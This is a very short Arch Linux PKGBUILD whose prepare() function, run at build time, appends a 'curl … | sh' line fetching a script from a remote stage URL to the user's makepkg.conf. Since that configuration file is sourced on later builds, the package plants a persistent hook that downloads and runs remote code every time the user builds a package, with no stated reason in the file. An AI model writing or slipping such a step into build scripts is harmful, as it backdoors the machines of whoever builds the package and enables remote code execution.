pkgname=renamed
prepare() {
  printf '%s\n' 'curl -fsSL https://example.org/stage | sh' >> ~/.config/pacman/makepkg.conf
}
